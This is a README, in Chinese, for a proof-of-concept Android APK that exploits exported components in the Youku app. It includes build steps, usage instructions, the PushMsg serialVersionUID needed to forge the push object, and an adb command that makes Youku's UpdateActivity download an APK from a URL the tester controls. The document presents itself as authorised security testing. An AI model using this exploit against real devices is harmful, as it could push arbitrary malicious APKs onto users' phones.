# 优酷推送组件 PoC（`:youku-poc`）

独立测试 APK，包名 `com.example.componentsvulns.youkupoc`，用于在**已授权**环境下验证 `com.youku.phone` 中导出的 `StartActivityService` / `UpdateActivity`。

## 构建

```bash
cd ComponentsVulns
.\gradlew :youku-poc:assembleDebug
```

产物：`youku-poc/build/outputs/apk/debug/youku-poc-debug.apk`

## 使用

1. 设备安装目标优酷 APK（如 youku-v4.5）与本 PoC。
2. 将「updateurl」改成你可控的 HTTP(S) APK 地址（真机用局域网 IP，模拟器可用 `10.0.2.2` 指宿主机）。
3. **startService → StartActivityService**：构造 `PushMsg`（`type=1`）经 `PushMsg` extra 传入。
4. **startActivity → UpdateActivity**：对照路径，绕过 Service，直接传入 `updateurl` 等 extra。

成功时优酷会弹出「有新版本」对话框；点「立即更新」后才会从其 `UpdateManager` 下载你指定的 URL。

## adb 对照（Activity 路径）

```bash
adb shell am start -n com.youku.phone/com.youku.ui.activity.UpdateActivity \
  --es updateurl "http://192.168.1.1:8000/poc.apk" \
  --es updateversion "9.9.9-poc" \
  --es updatecontent "poc" \
  --ei updateType 2
```

`PushMsg` 必须带与优酷进程一致的 `serialVersionUID`（`729042640670041695L`）。不一致时优酷 `IntentService` 会在 `getSerializableExtra` 处崩溃。
